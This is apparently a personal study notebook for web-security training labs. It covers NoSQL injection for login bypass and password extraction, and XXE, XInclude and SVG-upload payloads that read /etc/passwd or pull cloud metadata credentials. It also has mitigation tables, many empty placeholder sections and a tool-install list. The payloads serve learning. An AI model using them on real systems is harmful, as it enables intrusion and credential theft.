  - Replace referrer: http://192.168.0.§1§:8080
  - Payloads 1 - 255
  - Poll now > The Collaborator server received a DNS lookup of type A for the domain name **peter-JsfgSS**.jm9ykiwexvdtoukk8wf9br2kpbv2jw7l.oastify.com.   

## NoSQL Injection
Impact: Bypass authentication or protection; Extract or edit data; DoS; Execute code   
Types: synxtax (break the NoSQL query syntax), operator (manipulate queries)   
[MongoDB commands doc](https://www.mongodb.com/docs/v4.2/reference/operator/query/)

**NoSQL Injection Usage and Knowledge**
| **Syntax/Operator/Condition**  | **Description**                                                                    | **Example**                                                      |
|--------------------------------|------------------------------------------------------------------------------------|------------------------------------------------------------------|
| `db.collection.find()`         | Retrieves documents from a collection. Can be manipulated for injection.           | `db.users.find({name: "John"})`                                  |
| `db.collection.insertOne()`    | Inserts a single document into a collection.                                        | `db.users.insertOne({name: "John", age: 30})`                    |
| `db.collection.insertMany()`   | Inserts multiple documents into a collection.                                       | `db.users.insertMany([{name: "John", age: 30}, {name: "Jane", age: 25}])` |
| `db.collection.updateOne()`    | Updates a single document in a collection.                                          | `db.users.updateOne({name: "John"}, {$set: {age: 31}})`          |
| `db.collection.updateMany()`   | Updates multiple documents in a collection.                                         | `db.users.updateMany({age: {$gt: 25}}, {$set: {status: "active"}})` |
| `db.collection.deleteOne()`    | Deletes a single document from a collection.                                        | `db.users.deleteOne({name: "John"})`                             |
| `db.collection.deleteMany()`   | Deletes multiple documents from a collection.                                       | `db.users.deleteMany({age: {$lt: 20}})`                          |
| `db.collection.findOne()`      | Retrieves a single document from a collection.                                      | `db.users.findOne({name: "John"})`                               |
| `$and`                         | Combines multiple conditions with logical AND. Commonly used in injection attempts. | `db.users.find({$and: [{age: {$gt: 25}}, {status: "active"}]})`  |
| `$or`                          | Combines multiple conditions with logical OR. Often exploited in injections.        | `db.users.find({$or: [{age: {$lt: 20}}, {status: "inactive"}]})` |
| `$not`                         | Negates a condition. Can be used to bypass filters.                                  | `db.users.find({age: {$not: {$lt: 20}}})`                        |
| `$in`                          | Matches any of the values specified in an array. Useful in crafting injections.     | `db.users.find({status: {$in: ["active", "pending"]}})`          |
| `$nin`                         | Matches none of the values specified in an array.                                   | `db.users.find({status: {$nin: ["active", "pending"]}})`         |
| `$exists`                      | Matches documents that have the specified field.                                    | `db.users.find({email: {$exists: true}})`                        |
| `$regex`                       | Matches documents where the value of a field matches the specified regular expression. Useful for injections. | `db.users.find({name: {$regex: "^J"}})`                          |
| `$eq`                          | Matches documents where the value of a field equals the specified value.            | `db.users.find({age: {$eq: 25}})`                                |
| `$ne`                          | Matches documents where the value of a field does not equal the specified value.    | `db.users.find({age: {$ne: 25}})`                                |
| `$gt`                          | Matches documents where the value of a field is greater than the specified value.   | `db.users.find({age: {$gt: 25}})`                                |
| `$gte`                         | Matches documents where the value of a field is greater than or equal to the specified value. | `db.users.find({age: {$gte: 25}})`                               |
| `$lt`                          | Matches documents where the value of a field is less than the specified value.      | `db.users.find({age: {$lt: 25}})`                                |
| `$lte`                         | Matches documents where the value of a field is less than or equal to the specified value. | `db.users.find({age: {$lte: 25}})`                               |
| `$type`                        | Matches documents where the field is of the specified type.                         | `db.users.find({age: {$type: "int"}})`                           |
| `$mod`                         | Performs a modulo operation on the value of a field and matches documents.          | `db.users.find({age: {$mod: [5, 0]}})`                           |
| `$text`                        | Performs a text search on the content of the fields indexed with a text index.      | `db.users.find({$text: {$search: "John"}})`                      |
| `$geoWithin`                   | Matches documents with geospatial data within a specified shape.                    | `db.places.find({location: {$geoWithin: {$centerSphere: [[-73.9667, 40.78], 0.01]}}})` |
| `$size`                        | Matches any array with the number of elements specified.                            | `db.users.find({hobbies: {$size: 3}})`                           |
| `1=1`                          | Common injection payload used to bypass conditions.                                | `db.users.find({$where: "1==1"})`                                |
| `{} = {}`                      | Always-true condition for NoSQL injection.                                          | `db.users.find({$where: "{}=={}"})`                              |

**Best practices**
- input validation - sanitize, whitelist allowed inputs
- parameterized queries - avoid dynamic queries
- ORM/ODM framework
  
### NoSQL Injection Lab
- **Detecting NoSQL injection**
  - URL encode all payloads chrs
  - Test for syntax error
    - Syntax error: `'` > Command failed with error 139 (JSInterpreterFailure): &apos;SyntaxError: unterminated string literal
    - Correct Syntax: `Gifts'+'`> no error
  - Test for different response via Boolean condition
    - false: `Gifts' && 0 && 'x` > no listing
    - true: `Gifts' && 1 && 'x`> product listing
  - Submit a always true condition
    `Gifts'||1||'` > list out all products
- Exploiting NoSQL operator injection to **bypass authentication**
  - username not equal to nothing + actual password > login
    "username": `{"$ne":""}`   
    "password": "peter"   
  - regex admin* + password not equal to nothing > login
    "username": `{"$regex":"admin.*"}`   
    "password": `{"$ne":""}`    
- Exploiting NoSQL injection to **extract data**
  - identify the password length
    intruder > GET /user/lookup?user=`administrator' && this.password.length == '§1§`
    sniper | payload 1: number 5-15   
  - enumerate the password
    intruder >  GET /user/lookup?user=`administrator' %26%26+this.password.length+%3d%3d+'§8§`
    cluster bomb | payload 1: 0-7 | payload 2: a-z
- Exploiting NoSQL operator injection to **extract unknown fields**
  - Perform password reset for carlos function
  - identify if a **$where** clause is being evaluated
    - false > invalid username or password
      ```
      {
        "username": "carlos",
        "password": {
          "$ne": "invalid"
        },
        "$where": "0"
      }
      ```
    - true > account locked
       ```
      {
        "username": "carlos",
        "password": {
          "$ne": "invalid"
        },
        "$where": "1"
      }
      ```
  - **identify all the fields** on the user object
    - intruder > $where":"Object.keys(this)[1].match('^.{}.*')"
    ```
       {
        "username": "carlos",
        "password": {
          "$ne": "invalid"
        },
        "$where": "Object.keys(this)[0].match('^.{§§}§§.*')"
       }
    ```
    - cluster bomb | payload 1: Numbers 0-20 | payload 2: a-z, A-Z, and 0-9
    - start attack > repeat the index 0, 1, 2, 3, ...
    - Result: id, username, password, email, **changePwd**   
  - **Retrieve token** value
    - intruder > $where":"this.**YOURTOKENNAME**.match('^.{}.*')
    ```
    POST /login HTTP/2
    {
        "username": "carlos",
        "password": {
          "$ne": "invalid"
        },
        "$where": "this.changePwd.match('^.{§§}§§.*')"
    }
    ```
    - cluster bomb | payload 1: Numbers 0-20 | payload 2: a-z, A-Z, and 0-9
    - Result of token： 066ad5544cf9a375
  - Get the new password page
    - repeater > GET /forgot-password?YOURTOKENNAME=TOKENVALUE > Request in browser > Original session

## XXE Injection
Interfere with an application's processing of XML to view files on the application server file system, and interact with any back-end or external system. Leveraging XXE to perform SSRF.

| Term                      | Definition                                                                 | Example                                                        |
|---------------------------|----------------------------------------------------------------------------|----------------------------------------------------------------|
| **XML**                   | A language for encoding documents in a readable format for both humans and machines. | `<note><to>Tove</to><from>Jani</from><body>Don't forget me this weekend!</body></note>` |
| **XML Entities**          | Placeholders for data in XML documents.                                    | `<!ENTITY name "value">`                                       |
| **Document Type Definition (DTD)** | Rules that define the structure and allowed content of an XML document.            | `<!DOCTYPE note SYSTEM "note.dtd">`                            |
| **XML Custom Entities**   | User-defined placeholders in XML to simplify content.                      | `<!ENTITY custom "This is a custom entity">`                   |
| **XML External Entities (XXE)** | Custom entities that reference external data sources.                | `<!ENTITY xxe SYSTEM "file:///etc/passwd">`                    |

**XXE attack types**
- Exploiting XXE to retrieve files
- Exploiting XXE to perform SSRF attacks
- Exploiting blind XXE exfiltrate data out-of-band
- Exploiting blind XXE to retrieve data via error messages

**How to find and test for XXE vulnerabilities**
- Testing for file retrieval by defining an external entity
- Testing for blind XXE vulnerabilities by defining an external entity based on a URL (Burp Collaborator)
- Testing for vulnerable inclusion of user-supplied non-XML data within a server-side XML doc  by using an XInclude attack

**Mitigation**
- Disable External Entity Processing
- Sanitize XML Input
- Use Secure Libraries

| **Language**           | **Library/Parser** | **Code to Disable XXE**                                           |
|------------------------|---------------------|------------------------------------------------------------------|
| **Java**               | DOM Parser          | ```factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);``` |
|                        | SAX Parser          | ```factory.setFeature("http://xml.org/sax/features/external-general-entities", false);``` |
| **Python**             | lxml                | ```parser = etree.XMLParser(resolve_entities=False)``` |
| **PHP**                | libxml              | ```libxml_disable_entity_loader(true);``` |
| **.NET (C#)**          | XmlReader           | ```settings.DtdProcessing = DtdProcessing.Ignore;``` |
| **JavaScript (Node.js)** | xml2js             | ```parseStringPromise(data, { explicitArray: false });``` |
  
### XXE Injection Lab
- Exploiting XXE using external entities to **retrieve files**
  - Original: POST /product/stock
  ```
  <?xml version="1.0" encoding="UTF-8"?>
   <stockCheck>
     <productId>1</productId>
     <storeId>1</storeId>
   </stockCheck>
  ```
  - Insert **external entity definition**   
  ```
  <!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
   <stockCheck>
     <productId>&xxe;</productId>
     <storeId>1</storeId>
   </stockCheck>
  ```
- Exploiting XXE to perform **SSRF attacks**   
  `<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>`   
  ```
  Invalid product ID: {
  "Code" : "Success",
  "LastUpdated" : "2024-07-27T06:38:10.254304923Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "LXV3KdlXvSOWCyEXAvRZ",
  "SecretAccessKey" : "LUN1SXrOIQwuNHqGBkybvvkXEE0YtdQWp0s09io9",
  "Token" :    "DUz6RAWhqlG88IZPLdd0Ub5z5W2VVBFTpqonDCFCAZPd8AtRNQcJRQMyNnvKGLETEXVbqBxeuGt4OMXI87hkeYK5AWhOaRa5C1xKdviiTVMbn9LrtTktJGZOOdENDfqdgVZ31lloO8YcmDBUJmSjLntu7hWZxcpl9DkQpA6MVGPgPqzzfr78cNrZcTOCspN9z77CqHQhzrAEZVUOfCLfl4WpWnQiimURVkgNs1Yk36fgHBpFOVtAFiRdtUTW1TX4",
  "Expiration" : "2030-07-26T06:38:10.254304923Z"
   }
  ```   
- Exploiting **XInclude** to retrieve files
  - use cases: 1) don't have control over the entire XML document, only a part of it 2) app returns the contents of an element we control
  - Original: productId=2&storeId=1
  - Modified: productId=`<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>`&storeId=1
- Exploiting XXE via image **file upload**
  - SVG workflow
    - image upload? try a benign SVG file
    - if it doesn't, can you bypass file validation?
    - try to declare entities and exfil data in-band
    - if entities work, but no in-band reflection, try out of band
  - Post a comment and upload the SVG image > **create a local svg file**
   ```
   <?xml version="1.0" standalone="yes"?>
   <!DOCTYPE test [
     <!ENTITY xxe SYSTEM "file:///etc/hostname">
   ]>
   <svg width="128px" height="128px"
        xmlns="http://www.w3.org/2000/svg"
        xmlns:xlink="http://www.w3.org/1999/xlink"
        version="1.1">
     <text font-size="16" x="0" y="16">&xxe;</text>
   </svg>
   ``` 
- ddd
- ddd
- ddd
- ddd
- ddd

## API
Content for API...

### API Lab

## CSRF (Cross-Site Request Forgery)
Details about CSRF...

### CSRF Lab

## XSS (Cross-Site Scripting)
Details about XSS...

### XSS Lab

## CORS (Cross-Origin Resource Sharing)
Details about CORS...

### CORS Lab

## Clickjacking
Details about Clickjacking...

### Clickjacking Lab

## DOM-based Attacks
Details about DOM-based attacks...

### DOM-based Attacks Lab

## WebSockets
Details about WebSockets...

### WebSockets Lab

## Insecure Deserialization
Content for Insecure Deserialization...

### Insecure Deserialization Lab

## Web LLM Attacks
Content for Web LLM Attacks...

### Web LLM Attacks Lab

## GraphQL API
Content for GraphQL API...

### GraphQL API Lab

## Server-side Template Injection
Content for Server-side Template Injection...

### Server-side Template Injection Lab

## Web Cache Poisoning
Content for Web Cache Poisoning...

### Web Cache Poisoning Lab

## HTTP Host Header
Content for HTTP Host Header...

### HTTP Host Header Lab

## OAuth Authentication
Content for OAuth Authentication...

### OAuth Authenticatio Lab

## JWT Attacks
Content for JWT Attacks...

### JWT Attacks Lab

## Prototype Pollution
Content for Prototype Pollution...

### Prototype Pollution Lab

## Essential Skills
Content for Essential Skills...

# Windows installation tools
1. Burp Suite Pro
2. OWASP Zap
4. Install [chocolatey](https://chocolatey.org/install#individual) via PowerShell: Windows package manager to install and manage software
   - `choco install postman -y`
   - `choco install git -y`
   - `choco install python -y`
   - `choco install wget -y`
   - `choco install curl -y`
5. Cygwin
8. Nmap 
9. Wireshark 
10. Metaploit 
11. SQlmap 
12. Nikto 
13. Web Browser Extensions: Foxy Proxy, Wappalyzer, User-Agent Switcher, and HTTP Headers
14. Virtualization Software: VirtualBox or VMware Workstation Player

